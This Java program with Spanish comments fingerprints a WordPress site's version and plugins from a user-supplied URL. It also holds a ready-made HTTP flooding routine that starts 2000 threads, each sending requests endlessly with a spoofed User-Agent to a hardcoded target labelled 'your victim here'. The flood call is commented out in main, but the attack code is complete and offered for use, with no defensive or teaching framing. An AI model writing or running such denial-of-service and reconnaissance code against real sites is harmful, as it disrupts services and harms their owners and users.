package com.company;
import java.io.*;
import java.util.Scanner;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;



public class Main {

    public static void main(String[] args) throws Exception {


//   Pedimos URL

        Scanner scan = new Scanner(System.in);
        System.out.println("Ingresa  URL:");
        String  urlString = scan.nextLine();


        version(urlString);
        plugins(urlString);

// inicio_de_ataque();


            }





//Metodo para obtener la version de wp


    public static void version(String urlString) throws IOException {

        String p= urlString;


        URL pag = new URL("https://"+p);
        BufferedReader in = new BufferedReader(
                new InputStreamReader(pag.openStream()));

        String inputLine;
        while ((inputLine = in.readLine()) != null)
            if (inputLine.contains("generator")) {
                System.out.println("****Version*****"+inputLine);
                break;
            }




    }




//Metodo para obtener listado de plugins

    public static void plugins(String urlString) throws IOException {

        String p= urlString;


        URL pag = new URL("https://"+p);
        BufferedReader in = new BufferedReader(
                new InputStreamReader(pag.openStream()));

        String inputLine;
        while ((inputLine = in.readLine()) != null)

                if (inputLine.contains("plugins")){
                    System.out.println("****Lista de pligins*****"+inputLine);

                }


    }


//Attack

    public static void inicio_de_ataque() throws Exception {

        for (int i = 0; i < 2000; i++) {
            DdosThread thread = new DdosThread();
            thread.start();


        }

    }









    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = "http://overthewire.org/wargames/"; //your victim here
        private final URL url;

        String param = null;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }





        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {

                }

            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url
                    .openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", this.request);
            connection
                    .setRequestProperty("User-Agent",
                            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        }
    }











}

